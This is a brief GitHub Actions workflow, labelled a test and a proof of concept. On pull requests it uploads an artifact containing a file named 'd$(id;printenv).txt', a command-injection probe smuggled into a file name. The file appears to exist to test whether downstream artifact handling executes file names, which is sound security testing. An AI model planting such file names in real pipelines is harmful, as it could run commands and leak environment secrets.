name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          mkdir -p content
          printf 'payload\n' > 'content/d$(id;printenv).txt'
          ls -1 content
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
